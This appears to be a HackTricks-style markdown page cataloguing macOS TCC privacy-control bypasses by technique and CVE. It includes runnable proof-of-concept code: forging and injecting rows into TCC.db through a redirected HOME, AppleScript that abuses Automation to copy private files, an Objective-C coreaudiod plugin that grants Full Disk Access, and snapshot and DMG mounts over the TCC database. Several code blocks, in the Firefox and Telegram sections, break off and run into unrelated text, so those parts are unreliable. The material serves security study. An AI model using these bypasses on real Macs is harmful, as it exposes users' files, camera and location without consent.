_body: "# macOS TCC Bypasses\n\n{{#include ../../../../../banners/hacktricks-training.md}}\n\n## By functionality\n\n### Write\
  \ Bypass\n\nThis is not a bypass, it's just how TCC works: **It doesn't protect from writing**. If Terminal **doesn't have\
  \ access to read the Desktop of a user it can still write into it**:\n\n```shell-session\nusername@hostname ~ % ls Desktop\n\
  ls: Desktop: Operation not permitted\nusername@hostname ~ % echo asd > Desktop/lalala\nusername@hostname ~ % ls Desktop\n\
  ls: Desktop: Operation not permitted\nusername@hostname ~ % cat Desktop/lalala\nasd\n```\n\nThe **extended attribute `com.apple.macl`**\
  \ is added to the new **file** to give the **creators app** access to read it.\n\n### TCC ClickJacking\n\nIt's possible\
  \ to **put a window over the TCC prompt** to make the user **accept** it without noticing. You can find a PoC in [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**\n\

  >https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>\n\n\
  ### TCC Request by arbitrary name\n\nAttacker can **create apps with any name** (e.g. Finder, Google Chrome...) in the **`Info.plist`**\
  \ and make it request access to some TCC protected location. The user will think that the legit application is the one requesting\
  \ this access.\\\nMoreover, it's possible to **remove the legit app from the Dock and put the fake one on it**, so when\
  \ the user clicks on the fake one (which can use the same icon) it could call the legit one, ask for TCC permissions and\
  \ execute a malware, making the user believe the legit app requested the access.\n\n<figure><img src=\"https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048\"\
  \ alt=\"\" width=\"375\"><figcaption></figcaption></figure>\n\nMore info and PoC in:\n\n\n{{#ref}}\n../../../macos-privilege-escalation.md\n\
  {{#endref}}\n\n### SSH Bypass\n\nBy default an access via **SSH used to have \"Full Disk Access\"**. In order to disable\
  \ this you need to have it listed but disabled (removing it from the list won't remove those privileges):\n\n![](<../../../../../images/image\
  \ (1077).png>)\n\nHere you can find examples of how some **malwares have been able to bypass this protection**:\n\n- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)\n\
  \n> [!CAUTION]\n> Note that now, in order to be able to enable SSH you need **Full Disk Access**\n\n### Handle extensions\
  \ - CVE-2022-26767\n\nThe attribute **`com.apple.macl`** is given to files to give a **certain application permissions to\
  \ read it.** This attribute is set when **drag\\&drop** a file over an app, or when a user **double-clicks** a file to open\
  \ it with the **default application**.\n\nTherefore, a user could **register a malicious app** to handle all the extensions\
  \ and call Launch Services to **open** any file (so the malicious file will be granted access to read it).\n\n### iCloud\n\
  \nThe entitlement **`com.apple.private.icloud-account-access`** it's possible to communicate with **`com.apple.iCloudHelper`**\
  \ XPC service which will **provide iCloud tokens**.\n\n**iMovie** and **Garageband** had this entitlement and others that\
  \ allowed.\n\nFor more **information** about the exploit to **get icloud tokens** from that entitlement check the talk:\
  \ [**#OBTS v5.0: \"What Happens on your Mac, Stays on Apple's iCloud?!\" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)\n\
  \n### kTCCServiceAppleEvents / Automation\n\nAn app with the **`kTCCServiceAppleEvents`** permission will be able to **control\
  \ other Apps**. This means that it could be able to **abuse the permissions granted to the other Apps**.\n\nFor more info\
  \ about Apple Scripts check:\n\n\n{{#ref}}\nmacos-apple-scripts.md\n{{#endref}}\n\nFor example, if an App has **Automation\
  \ permission over `iTerm`**, for example in this example **`Terminal`** has access over iTerm:\n\n<figure><img src=\"../../../../../images/image\
  \ (981).png\" alt=\"\"><figcaption></figcaption></figure>\n\n#### Over iTerm\n\nTerminal, who doesn't have FDA, can call\
  \ iTerm, which has it, and use it to perform actions:\n\n```applescript:iterm.script\ntell application \"iTerm\"\n    activate\n\
  \    tell current window\n        create tab with default profile\n    end tell\n    tell current session of current window\n\
  \        write text \"cp ~/Desktop/private.txt /tmp\"\n    end tell\nend tell\n```\n\n```bash\nosascript iterm.script\n\
  ```\n\n#### Over Finder\n\nOr if an App has access over Finder, it could a script such as this one:\n\n```applescript\n\
  set a_user to do shell script \"logname\"\ntell application \"Finder\"\nset desc to path to home folder\nset copyFile to\
  \ duplicate (item \"private.txt\" of folder \"Desktop\" of folder a_user of item \"Users\" of disk of home) to folder desc\
  \ with replacing\nset t to paragraphs of (do shell script \"cat \" & POSIX path of (copyFile as alias)) as text\nend tell\n\
  do shell script \"rm \" & POSIX path of (copyFile as alias)\n```\n\n## By App behaviour\n\n### CVE-2020–9934 - TCC <a href=\"\
  #c19b\" id=\"c19b\"></a>\n\nThe userland **tccd daemon** what using the **`HOME`** **env** variable to access the TCC users\
  \ database from: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**\n\nAccording to [this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)\
  \ and because the TCC daemon is running via `launchd` within the current user’s domain, it's possible to **control all environment\
  \ variables** passed to it.\\\nThus, an **attacker could set `$HOME` environment** variable in **`launchctl`** to point\
  \ to a **controlled** **directory**, **restart** the **TCC** daemon, and then **directly modify the TCC database** to give\
  \ itself **every TCC entitlement available** without ever prompting the end user.\\\nPoC:\n\n```bash\n# reset database just\
  \ in case (no cheating!)\n$> tccutil reset All\n# mimic TCC's directory structure from ~/Library\n$> mkdir -p \"/tmp/tccbypass/Library/Application\
  \ Support/com.apple.TCC\"\n# cd into the new directory\n$> cd \"/tmp/tccbypass/Library/Application Support/com.apple.TCC/\"\
  \n# set launchd $HOME to this temporary directory\n$> launchctl setenv HOME /tmp/tccbypass\n# restart the TCC daemon\n$>\
  \ launchctl stop com.apple.tccd && launchctl start com.apple.tccd\n# print out contents of TCC database and then give Terminal\
  \ access to Documents\n$> sqlite3 TCC.db .dump\n$> sqlite3 TCC.db \"INSERT INTO access\n                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',\n\
  \                   'com.apple.Terminal', 0, 1, 1,\nX'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',\n\
  \                   NULL,\n                   NULL,\n                   'UNUSED',\n                   NULL,\n          \
  \         NULL,\n                   1333333333333337);\"\n# list Documents directory without prompting the end user\n$>\
  \ ls ~/Documents\n```\n\n### CVE-2021-30761 - Notes\n\nNotes had access to TCC protected locations but when a note is created\
  \ this is **created in a non-protected location**. So, you could ask notes to copy a protected file in a noe (so in a non-protected\
  \ location) and then access the file:\n\n<figure><img src=\"../../../../../images/image (476).png\" alt=\"\"><figcaption></figcaption></figure>\n\
  \n### CVE-2021-30782 - Translocation\n\nThe binary `/usr/libexec/lsd` with the library `libsecurity_translocate` had the\
  \ entitlement `com.apple.private.nullfs_allow` which allowed it to crate **nullfs** mount and had the entitlement `com.apple.private.tcc.allow`\
  \ with **`kTCCServiceSystemPolicyAllFiles`** to access every file.\n\nIt was possible to add the quarantine attribute to\
  \ \"Library\", call the **`com.apple.security.translocation`** XPC service and then it would map Library to **`$TMPDIR/AppTranslocation/d/d/Library`**\
  \ where all the documents inside Library could be **accessed**.\n\n### CVE-2023-38571 - Music & TV <a href=\"#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv\"\
  \ id=\"cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv\"></a>\n\n**`Music`** has an interesting feature: When it's running,\
  \ it will **import** the files dropped to **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** into\
  \ the user's \"media library\". Moreover, it calls something like: **`rename(a, b);`** where `a` and `b` are:\n\n- `a =\
  \ \"~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3\"`\n- `b = \"~/Music/Music/Media.localized/Automatically\
  \ Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`\n\nThis **`rename(a, b);`** bevabiour is vulnerable\
  \ to a **Race Condition**, as it's possible to put inside the `Automatically Add to Music.localized` folder a fake **TCC.db**\
  \ file and then when the new forder(b) is created to copy the file, delete it, and point it to **`~/Library/Application\
  \ Support/com.apple.TCC`**/.\n\n### SQLITE_SQLLOG_DIR - CVE-2023-32422\n\nIf **`SQLITE_SQLLOG_DIR=\"path/folder\"`** basically\
  \ means that **any open db is copied to that path**. In this CVE this control was abused to **write** inside a **SQLite\
  \ database** that is going to be **open by a process with FDA the TCC database**, and then abuse **`SQLITE_SQLLOG_DIR`**\
  \ with a **symlink in the filename** so when that database is **open**, the user **TCC.db is overwritten** with the opened\
  \ one.\\\n**More info** [**in the writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **and**[\
  \ **in the talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).\n\n### **SQLITE_AUTO_TRACE**\n\nIf the environment\
  \ variable **`SQLITE_AUTO_TRACE`** is set, the library **`libsqlite3.dylib`** will start **logging** all the SQL queries.\
  \ Many applications used this library, so it was possible to log all their SQLite queries.\n\nSeveral Apple applications\
  \ used this library to access TCC protected information.\n\n```bash\n# Set this env variable everywhere\nlaunchctl setenv\
  \ SQLITE_AUTO_TRACE 1\n```\n\n### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407\n\nThis **env variable is used by the\
  \ `Metal` framework** which is a dependency to various programs, most notably `Music`, which has FDA.\n\nSetting the following:\
  \ `MTL_DUMP_PIPELINES_TO_JSON_FILE=\"path/name\"`. If `path` is a valid directory, the bug will trigger and we can use `fs_usage`\
  \ to see what is going on in the program:\n\n- a file will be `open()`ed, called `path/.dat.nosyncXXXX.XXXXXX` (X is random)\n\
  - one or more `write()`s will write the contents to the file (we do not control this)\n- `path/.dat.nosyncXXXX.XXXXXX` will\
  \ be `renamed()`d to `path/name`\n\nIt's a temporary file write, followed by a **`rename(old, new)`** **which is not secure.**\n\
  \nIt's not secure because it has to **resolve the old and new paths separately**, which can take some time and can be vulenrable\
  \ to a Race Condition. For more information you can check out the `xnu` function `renameat_internal()`.\n\n> [!CAUTION]\n\
  > So, basically, if a privileged process is renaming from a folder you control, you could win a RCE and make it access a\
  \ different file or, like in this CVE, open the file the privileged app created and store a FD.\n>\n> If the rename access\
  \ a folder you control, while you have modified the source file or has a FD to it, you change the destination file (or folder)\
  \ to point a symlink, so you can write whenever you want.\n\nThis was the attack in the CVE: For example, to overwrite the\
  \ user's `TCC.db`, we can:\n\n- create `/Users/hacker/ourlink` to point to `/Users/hacker/Library/Application Support/com.apple.TCC/`\n\
  - create the directory `/Users/hacker/tmp/`\n- set `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`\n- trigger\
  \ the bug by running `Music` with this env var\n- catch the `open()` of `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X is\
  \ random)\n  - here we also `open()` this file for writing, and hold on to the file descriptor\n- atomically switch `/Users/hacker/tmp`\
  \ with `/Users/hacker/ourlink` **in a loop**\n  - we do this to maximize our chances of succeeding as the race window is\
  \ pretty slim, but losing the race has negligible downside\n- wait a bit\n- test if we got lucky\n  - if not, run again\
  \ from the top\n\nMore info in [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)\n\
  \n> [!CAUTION]\n> Now, if you try to use the env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE` apps won't launch\n\n### Apple\
  \ Remote Desktop\n\nAs root you could enable this service and the **ARD agent will have full disk access** which could then\
  \ be abused by a user to make it copy a new **TCC user database**.\n\n## By **NFSHomeDirectory**\n\nTCC uses a database\
  \ in the user's HOME folder to control access to resources specific to the user at **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\\\
  \nTherefore, if the user manages to restart TCC with a $HOME env variable pointing to a **different folder**, the user could\
  \ create a new TCC database in **/Library/Application Support/com.apple.TCC/TCC.db** and trick TCC to grant any TCC permission\
  \ to any app.\n\n> [!TIP]\n> Note that Apple uses the setting stored within the user's profile in the **`NFSHomeDirectory`**\
  \ attribute for the **value of `$HOME`**, so if you compromise an application with permissions to modify this value (**`kTCCServiceSystemPolicySysAdminFiles`**),\
  \ you can **weaponize** this option with a TCC bypass.\n\n### [CVE-2020–9934 - TCC](#c19b) <a href=\"#c19b\" id=\"c19b\"\
  ></a>\n\n### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)\n\n### CVE-2021-30970 - Powerdir\n\
  \nThe **first POC** uses [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) and [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)\
  \ to modify the **HOME** folder of the user.\n\n1. Get a _csreq_ blob for the target app.\n2. Plant a fake _TCC.db_ file\
  \ with required access and the _csreq_ blob.\n3. Export the user’s Directory Services entry with [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).\n\
  4. Modify the Directory Services entry to change the user’s home directory.\n5. Import the modified Directory Services entry\
  \ with [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).\n6. Stop the user’s _tccd_ and reboot the process.\n\
  \nThe second POC used **`/usr/libexec/configd`** which had `com.apple.private.tcc.allow` with the value `kTCCServiceSystemPolicySysAdminFiles`.\\\
  \nIt was possible to run **`configd`** with the **`-t`** option, an attacker could specify a **custom Bundle to load**.\
  \ Therefore, the exploit **replaces** the **`dsexport`** and **`dsimport`** method of changing the user’s home directory\
  \ with a **`configd` code injection**.\n\nFor more info check the [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).\n\
  \n## By process injection\n\nThere are different techniques to inject code inside a process and abuse its TCC privileges:\n\
  \n\n{{#ref}}\n../../../macos-proces-abuse/\n{{#endref}}\n\nMoreover, the most common process injection to bypass TCC found\
  \ is via **plugins (load library)**.\\\nPlugins are extra code usually in the form of libraries or plist, that will be **loaded\
  \ by the main application** and will execute under its context. Therefore, if the main application had access to TCC restricted\
  \ files (via granted permissions or entitlements), the **custom code will also have it**.\n\n### CVE-2020-27937 - Directory\
  \ Utility\n\nThe application `/System/Library/CoreServices/Applications/Directory Utility.app` had the entitlement **`kTCCServiceSystemPolicySysAdminFiles`**,\
  \ loaded plugins with **`.daplug`** extension and **didn't have the hardened** runtime.\n\nIn order to weaponize this CVE,\
  \ the **`NFSHomeDirectory`** is **changed** (abusing the previous entitlement) in order to be able to **take over the users\
  \ TCC databas**e to bypass TCC.\n\nFor more info check the [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).\n\
  \n### CVE-2020-29621 - Coreaudiod\n\nThe binary **`/usr/sbin/coreaudiod`** had the entitlements `com.apple.security.cs.disable-library-validation`\
  \ and `com.apple.private.tcc.manager`. The first **allowing code injection** and second one giving it access to **manage\
  \ TCC**.\n\nThis binary allowed to load **third party plug-ins** from the folder `/Library/Audio/Plug-Ins/HAL`. Therefore,\
  \ it was possible to **load a plugin and abuse the TCC permissions** with this PoC:\n\n```objectivec\n#import <Foundation/Foundation.h>\n\
  #import <Security/Security.h>\n\nextern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef\
  \ bundleID, CFDataRef requirement, CFBooleanRef giveAccess);\n\nvoid add_tcc_entry() {\n    CFStringRef TCCAccessCheckType\
  \ = CFSTR(\"kTCCServiceSystemPolicyAllFiles\");\n\n    CFStringRef bundleID = CFSTR(\"com.apple.Terminal\");\n    CFStringRef\
  \ pureReq = CFSTR(\"identifier \\\"com.apple.Terminal\\\" and anchor apple\");\n    SecRequirementRef requirement = NULL;\n\
  \    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);\n    CFDataRef requirementData = NULL;\n\
  \    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);\n\n    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType,\
  \ bundleID, requirementData, kCFBooleanTrue);\n}\n\n__attribute__((constructor)) static void constructor(int argc, const\
  \ char **argv) {\n\n    add_tcc_entry();\n\n    NSLog(@\"[+] Exploitation finished...\");\n    exit(0);\n```\n\nFor more\
  \ info check the [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).\n\
  \n### Device Abstraction Layer (DAL) Plug-Ins\n\nSystem applications that open camera stream via Core Media I/O (apps with\
  \ **`kTCCServiceCamera`**) load **in the process these plugins** located in `/Library/CoreMediaIO/Plug-Ins/DAL` (not SIP\
  \ restricted).\n\nJust storing in there a library with the common **constructor** will work to **inject code**.\n\nSeveral\
  \ Apple applications were vulnerable to this.\n\n### Firefox\n\nThe Firefox application had the `com.apple.security.cs.disable-library-validation`\
  \ and `com.apple.security.cs.allow-dyld-environment-variables` entitlements:\n\n```xml\ncodesign -d --entitlements :- /Applications/Firefox.app\n\

  \ to easily exploit this [**check the original report**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).\n\n###\
  \ CVE-2020-10006\n\nThe binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` had the entitlements **`com.apple.private.tcc.allow`**\
  \ and **`com.apple.security.get-task-allow`**, which allowed to inject code inside the process and use the TCC privileges.\n\
  \n### CVE-2023-26818 - Telegram\n\nTelegram had the entitlements **`com.apple.security.cs.allow-dyld-environment-variables`**\
  \ and **`com.apple.security.cs.disable-library-validation`**, so it was possible to abuse it to **get access to its permissions**\
  \ such recording with the camera. You can [**find the payload in the writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).\n\
  \nNote how to use the env variable to load a library a **custom plist** was created to inject this library and **`launchctl`**\
  \ was used to launch it:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST\

  \ quiet common to give terminal **Full Disk Access (FDA)**, at least in computers used by tech people. And it's possible\
  \ to invoke **`.terminal`** scripts using with it.\n\n**`.terminal`** scripts are plist files such as this one with the\
  \ command to execute in the **`CommandString`** key:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist\
  \ PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> <plist version=\"1.0\">\n<dict>\n\
  \    <key>CommandString</key>\n    <string>cp ~/Desktop/private.txt /tmp/;</string>\n    <key>ProfileCurrentVersion</key>\n\
  \    <real>2.0600000000000001</real>\n    <key>RunCommandAsShell</key>\n    <false/>\n    <key>name</key>\n    <string>exploit</string>\n\
  \    <key>type</key>\n    <string>Window Settings</string>\n</dict>\n</plist>\n```\n\nAn application could write a terminal\
  \ script in a location such as /tmp and launch it with a come such as:\n\n```objectivec\n// Write plist in /tmp/tcc.terminal\n\
  [...]\nNSTask *task = [[NSTask alloc] init];\nNSString * exploit_location = @\"/tmp/tcc.terminal\";\ntask.launchPath = @\"\
  /usr/bin/open\";\ntask.arguments = @[@\"-a\", @\"/System/Applications/Utilities/Terminal.app\",\nexploit_location]; task.standardOutput\
  \ = pipe;\n[task launch];\n```\n\n## By mounting\n\n### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation\n\
  \n**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that\
  \ snapshot.\\\nThe **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access**\
  \ (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.\n\n```bash\n# Create snapshot\n\
  tmutil localsnapshot\n\n# List snapshots\ntmutil listlocalsnapshots /\nSnapshots for disk /:\ncom.apple.TimeMachine.2023-05-29-001751.local\n\
  \n# Generate folder to mount it\ncd /tmp # I didn it from this folder\nmkdir /tmp/snap\n\n# Mount it, \"noowners\" will\
  \ mount the folder so the current user can access everything\n/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local\
  \ /System/Volumes/Data /tmp/snap\n\n# Access it\nls /tmp/snap/Users/admin_user # This will work\n```\n\nA more detailed\
  \ explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**\n\n### CVE-2021-1784\
  \ & CVE-2021-30808 - Mount over TCC file\n\nEven if TCC DB file is protected, It was possible to **mount over the directory**\
  \ a new TCC.db file:\n\n```bash\n# CVE-2021-1784\n## Mount over Library/Application\\ Support/com.apple.TCC\nhdiutil attach\
  \ -owners off -mountpoint Library/Application\\ Support/com.apple.TCC test.dmg\n\n# CVE-2021-1784\n## Mount over ~/Library\n\
  hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg\n```\n\n```python\n# This was the python function\
  \ to create the dmg\ndef create_dmg():\n    os.system(\"hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \\\"tccbypass\\\
  \" -fs APFS 1>/dev/null\")\n    os.system(\"mkdir /tmp/mnt\")\n    os.system(\"hdiutil attach -owners off -mountpoint /tmp/mnt\
  \ /tmp/tmp.dmg 1>/dev/null\")\n    os.system(\"mkdir -p /tmp/mnt/Application\\ Support/com.apple.TCC/\")\n    os.system(\"\
  cp /tmp/TCC.db /tmp/mnt/Application\\ Support/com.apple.TCC/TCC.db\")\n    os.system(\"hdiutil detach /tmp/mnt 1>/dev/null\"\
  )\n```\n\nCheck the **full exploit** in the [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).\n\
  \n### CVE-2024-40855\n\nAs explained in the [original writeup](https://www.kandji.io/blog/macos-audit-story-part2), this\
  \ CVE abused `diskarbitrationd`.\n\nThe function `DADiskMountWithArgumentsCommon` from the public `DiskArbitration` framework\
  \ performed the security checks. However, it's possible to bypass it by directly calling `diskarbitrationd` and therefore\
  \ use `../` elements in the path and symlinks.\n\nThis allowed an attacker to do arbitrary mounts in any location, including\
  \ over the TCC database due to the entitlement `com.apple.private.security.storage-exempt.heritable` of `diskarbitrationd`.\n\
  \n### asr\n\nThe tool **`/usr/sbin/asr`** allowed to copy the whole disk and mount it in another place bypassing TCC protections.\n\
  \n### Location Services\n\nThere is a third TCC database in **`/var/db/locationd/clients.plist`** to indicate clients allowed\
  \ to **access location services**.\\\nThe folder **`/var/db/locationd/` wasn't protected from DMG mounting** so it was possible\
  \ to mount our own plist.\n\n## By startup apps\n\n\n{{#ref}}\n../../../../macos-auto-start-locations.md\n{{#endref}}\n\n\
  ## By grep\n\nIn several occasions files will store sensitive information like emails, phone numbers, messages... in non\
  \ protected locations (which count as a vulnerability in Apple).\n\n<figure><img src=\"../../../../../images/image (474).png\"\
